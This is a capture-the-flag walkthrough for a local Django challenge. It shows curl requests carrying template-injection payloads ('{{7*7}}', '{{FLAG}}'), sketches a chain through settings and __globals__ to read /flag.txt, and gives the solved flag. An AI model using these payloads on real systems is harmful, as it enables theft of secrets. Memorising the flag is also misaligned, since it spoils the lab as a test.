# larch — walkthrough

Entry: `http://127.0.0.1:18953/greet/?name=hello` (Django, Python 3.9).

## 1. Prove evaluation

```bash
curl -s 'http://127.0.0.1:18953/greet/?name={{7*7}}'   # -> 49
```

## 2. Context first, filesystem second

The view passes the flag into the template context under its own name:

```bash
curl -s 'http://127.0.0.1:18953/greet/?name={{FLAG}}'
```

One request, flag out. (If the context were bare, the usual Django chain
`{{ settings.SECRET_KEY }}` → `request.META` → `__init__.__globals__` file
objects would get you `/flag.txt` — but here the app already did the
favour.)

## Flag

```
FLAG{xbow_larch_18b8ca2b26b2e0330551585f}}
```

`sha256(flag)[:8] = ca0ef70b`

Doubled closing brace: house flag shape, as planted.
